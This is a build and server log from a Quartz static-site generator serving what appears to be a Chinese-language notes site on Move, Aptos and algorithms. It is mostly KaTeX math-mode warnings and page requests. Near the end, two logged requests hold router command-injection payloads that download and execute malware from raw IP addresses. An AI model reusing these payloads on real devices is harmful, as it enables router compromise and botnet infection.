
 Quartz v4.2.3 

Cleaned output directory `public` in 17ms
Found 25 input files from `content` in 15ms
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "０" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "，" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "，" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "，" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "０" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "求" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "值" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "，" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "直" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "接" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "方" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "法" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "是" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "对" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "每" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "一" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "项" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "分" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "别" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "求" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "值" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "，" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "并" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "把" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "每" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "一" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "项" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "求" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "的" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "值" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "累" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "加" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "起" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "来" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "，" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "这" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "种" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "方" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "法" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "十" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "分" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "低" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "效" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "，" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "它" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "需" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "要" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "进" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "行" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "次" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "乘" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "法" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "运" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "算" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "和" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "０" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＝" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "１" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "２" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "０" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "＋" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
LaTeX-incompatible input and strict mode is set to 'warn': Unicode text character "－" used in math mode [unicodeTextInMathMode]
[2K[1GParsed 25 Markdown files in 6s
Filtered out 0 files in 175μs
[2K[1GEmitted 44 files to `public` in 1s
Done processing 25 files in 7s
Started a Quartz server listening at http://localhost:8080
hint: exit with ctrl+c
[200] /%E7%AE%97%E6%B3%95/%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0
[200] /prescript.js
[200] /static/contentIndex.json
[200] /
[200] /%E7%AE%97%E6%B3%95/%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0
[200] /prescript.js
[200] /static/contentIndex.json
[200] /
Detected change, rebuilding...
[2K[1GParsed 1 Markdown files in 473ms
Filtered out 0 files in 50μs
[2K[1GEmitted 44 files to `public` in 2s
Done rebuilding in 3s
Detected change, rebuilding...
[2K[1GParsed 0 Markdown files in 306μs
Filtered out 0 files in 39μs
[2K[1GEmitted 44 files to `public` in 2s
Done rebuilding in 2s
[200] /
[200] /prescript.js
[200] /static/contentIndex.json
[404] /TypeScript
[200] /%E4%BB%8Ehello_world%E5%BC%80%E5%A7%8B
[404] /%E5%85%AC%E9%93%BE
[200] /
[200] /prescript.js
[200] /static/contentIndex.json
[200] /%E4%BB%8Ehello_world%E5%BC%80%E5%A7%8B
[404] /%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B
[200] /%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88/AIP-73
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88/AIP-73
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88/AIP-73
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88/AIP-73
[404] /%E5%85%AC%E9%93%BE
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88
[200] /
[200] /
[200] /
[200] /
[200] /prescript.js
[200] /static/contentIndex.json
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88
[200] /Move-%E7%9A%84%E5%8E%86%E5%8F%B2
[200] /%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83
[404] /%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B
[200] /%E4%BB%8Ehello_world%E5%BC%80%E5%A7%8B
[200] /%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88/AIP-73
[200] /test
[200] /Aptos-%E6%A0%87%E5%87%86%E5%BA%93/Aptos-Smart-Table
[200] /Aptos-%E6%A0%87%E5%87%86%E5%BA%93/Aptos-Smart-Table
[200] /%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9C%A8%E7%BA%BFMove%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83
[200] /%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%9C%A8%E7%BA%BFMove%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83
[200] /Aptos-%E6%9C%AF%E8%AF%AD%E8%A1%A8
[200] /Move-%E6%A0%87%E5%87%86%E5%BA%93/Move-Vector
[200] /%E5%AF%86%E7%A0%81%E5%AD%A6
[200] /%E5%90%8E%E5%90%91%E8%BE%B9%EF%BC%88Back-Edge%EF%BC%89
[200] /%E6%8E%A7%E5%88%B6%E6%B5%81
[200] /
[200] /postscript.js
[200] /index.css
[200] /prescript.js
[200] /static/contentIndex.json
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88
[200] /Aptos-%E4%BC%98%E5%8C%96%E6%8F%90%E6%A1%88
[200] /Move-%E7%9A%84%E5%8E%86%E5%8F%B2
[200] /Move-%E7%9A%84%E5%8E%86%E5%8F%B2
[404] /client/get_targets
[404] /Move
[404] /Move
[200] /%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83
[200] /%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83
[200] /
[404] /%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0
[404] /%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0
[200] /index.css
[200] /prescript.js
[200] /postscript.js
[200] /static/contentIndex.json
[404] /%E5%9F%BA%E7%A1%80
[404] /%E5%9F%BA%E7%A1%80
[200] /%E5%AF%86%E7%A0%81%E5%AD%A6
[200] /%E5%AF%86%E7%A0%81%E5%AD%A6
[404] /%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3
[404] /%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3
[404] /%E6%A1%88%E4%BE%8B%E6%95%99%E7%A8%8B
[404] /%E6%A1%88%E4%BE%8B%E6%95%99%E7%A8%8B
[200] /%E7%AE%97%E6%B3%95/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C
[200] /%E7%AE%97%E6%B3%95/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C
[404] /%E5%BC%80%E5%8F%91%E6%95%99%E7%A8%8B
[200] /
[404] /%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3
[404] /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F193.233.203.237%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)
[200] /test
[404] /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.86.202%2Ft+-O-+|+sh%60)
[200] /Aptos-%E6%9C%AF%E8%AF%AD%E8%A1%A8
